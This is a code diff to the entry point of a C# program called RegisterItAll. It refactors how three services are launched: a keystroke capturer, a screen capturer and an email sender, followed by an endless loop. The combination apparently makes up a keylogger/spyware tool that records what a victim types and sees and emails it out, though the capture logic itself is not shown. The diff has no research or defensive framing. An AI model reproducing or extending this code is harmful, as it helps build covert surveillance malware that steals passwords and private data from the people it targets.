@@ -1,7 +1,5 @@
 ﻿using RegisterItAll.Services;
 using RegisterItAll.Services.Base;
-using System.Linq;
-using System.ServiceProcess;
 
 namespace RegisterItAll
 {
@@ -9,26 +7,19 @@ namespace RegisterItAll
     {
         public static void Main(string[] args)
         {
-            ExecutableAsConsoleApplicationService[] servicesToRun = new ExecutableAsConsoleApplicationService[]
+            Service[] servicesToRun = new Service[]
             {
                 new EmailSenderService(),
                 new KeystrokesCapturerService(),
                 new ScreenCapturerService(),
             };
 
-            if (args.ToList().Contains("-RunAsConsoleApplication"))
+            foreach (Service service in servicesToRun)
             {
-                foreach (ExecutableAsConsoleApplicationService service in servicesToRun)
-                {
-                    service.ExecuteAsConsoleApplication(args);
-                }
+                service.Run();
+            }
 
-                while (true) { }
-            }
-            else
-            {
-                ServiceBase.Run(servicesToRun);
-            }
+            while (true) { }
         }
     }
 }
